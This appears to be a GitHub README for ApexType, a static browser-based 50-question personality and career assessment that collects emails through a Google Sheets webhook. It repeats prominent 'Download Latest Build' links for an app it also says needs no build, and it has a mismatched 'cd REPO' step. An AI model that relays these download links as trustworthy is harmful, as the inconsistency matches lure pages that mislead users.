# ApexType v2026 - online assessment 2026

> **ApexType is a browser-based strengths and personality assessment that converts 50 answers into one of 7 archetype profiles, along with a tailored roadmap and career-oriented guidance.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seantaylorlco8804/apextype-career-roadmap?style=flat-square)](https://github.com/seantaylorlco8804/apextype-career-roadmap)

---

<p align="center">
  <a href="https://seantaylorlco8804.github.io/apextype-career-roadmap/">
    <img src="https://img.shields.io/badge/Download-ApexType%20Latest-brightgreen?style=for-the-badge" alt="Download ApexType">
  </a>
</p>

> **[Download ApexType v2026](https://seantaylorlco8804.github.io/apextype-career-roadmap/)**

---

[Download Latest Build](https://seantaylorlco8804.github.io/apextype-career-roadmap/)

---

## What ApexType Does

ApexType provides a structured, browser-based way to examine personal strengths, personality tendencies, and preferred working styles. After users complete its 50-question assessment, the site presents an accessible profile intended to support self-reflection, coaching conversations, and career planning.

The project is delivered as a static HTML, CSS, and JavaScript application, making it suitable for GitHub Pages and other static web hosts. Its supporting workflow can use Google Apps Script and Google Sheets for handling submitted data, while Chart.js is used to display assessment results visually.

---

## Core Capabilities

- A 50-item strengths assessment
- Result classification across 7 archetypes
- Response-based personalized roadmap generation
- Combo subtype matching for deeper profile detail
- Webhook support for collecting email addresses
- Static HTML, CSS, and JavaScript implementation
- Result charts powered by Chart.js
- Deployment support for GitHub Pages and browser-based hosting

---

## Getting Started

Download or clone the repository, then serve the files from a web host or publish them with GitHub Pages.

    git clone https://github.com/seantaylorlco8804/apextype-career-roadmap.git
    cd REPO

You can open the site in a browser after downloading it, or upload the static files to your hosting provider. For local testing, run a preview server from the repository directory and visit the local URL it provides.

---

## Using the Assessment

1. Launch the site in a modern browser.
2. Answer all 50 assessment questions.
3. Examine the resulting archetype and strengths overview.
4. Use the personalized roadmap as guidance for possible next steps.
5. When configured, provide contact information through the email webhook workflow.

The application can be hosted as static content and does not require a build step for deployment. After changing questions, chart behavior, or result mappings, publish the updated files and reload the site.

---

## Settings and Data Connections

Frontend scripts and connected Google Apps Script endpoints generally contain the project configuration.

    {
      "webhook_url": "YOUR_WEBHOOK_URL",
      "sheet_id": "YOUR_GOOGLE_SHEET_ID",
      "assessment_questions": 50,
      "archetypes": 7
    }

Before publishing, replace the relevant endpoint and script bindings if responses will be sent to Google Sheets. The site files also contain the chart labels, profile copy, and roadmap material, which can be edited there as needed.

---

## What You Need

- A current web browser
- A static hosting service, including GitHub Pages
- Optional Google Apps Script for webhook or form processing
- Optional Google Sheets for submission storage
- Optional Chart.js for visual result displays
- Storage for the HTML, CSS, and JavaScript files

---

## Frequently Asked Questions

**How can I change the questions or results?**  
Modify the question collection, archetype rules, and roadmap wording in the site scripts, then publish the revised static files.

**Does ApexType require a backend?**  
No. ApexType is structured as a static website and can run on any host that serves HTML, CSS, and JavaScript.

**Where do assessment submissions go?**  
When the Google Apps Script and Google Sheets integration is configured, submissions can be sent through that workflow. Basic use does not require data storage otherwise.

**Why are the charts missing?**  
Check that Chart.js has been included properly and verify that the browser can reach all required asset files.

**How do I publish a newer release?**  
Upload the latest project files to your GitHub Pages branch or selected hosting service, then reload the deployment URL.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
